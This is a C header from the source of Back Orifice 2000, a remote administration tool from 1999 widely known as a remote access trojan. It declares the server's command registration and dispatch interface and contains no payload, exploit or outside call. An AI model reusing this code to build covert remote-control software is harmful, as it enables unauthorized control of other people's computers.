/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This file is free software, and not subject to GNU Public License
	restrictions; you can redistribute it and/or modify it in any way 
	you see fit. This file is suitable for inclusion in a derivative
	work, regardless of license on the work or availability of source code
	to the work. If you redistribute this file, you must leave this
	header intact.
    
	This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  

	The author of this program may be contacted at dildog@l0pht.com. */

#ifndef __INC_BOCOMREG_H
#define __INC_BOCOMREG_H

#include<windows.h>
#include<auth.h>

#define MAX_BO_COMMANDS 1024
#define INVALID_CMD_HANDLER ((BO_CMD_HANDLER) NULL)

typedef int (*BO_CMD_HANDLER)(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3);
#pragma pack(push,1)
typedef struct {
	BOOL bNativeComm;
	char *svFolderName;
	char *svCommName;
	char *svArgDesc1;
	char *svArgDesc2;
	char *svArgDesc3;
} BO_CMD_DESC; 
#pragma pack(pop)

#ifdef __BO2KSERVER__

extern BO_CMD_HANDLER *command_handler_table;
extern BO_CMD_DESC *command_description_table;

int InitializeCommandDispatcher(void);
int KillCommandDispatcher(void);
int RegisterNativeCommand(int command, BO_CMD_HANDLER handler);
int RegisterCommand(BO_CMD_HANDLER handler, char *svFolderName, char *svCommName, char *svArgDesc1, char *svArgDesc2, char *svArgDesc3);
int UnregisterCommand(int command);
int DispatchCommand(int command, CAuthSocket *cas_from, int comid, int nArg1, char *svArg2, char *svArg3);

#endif

#endif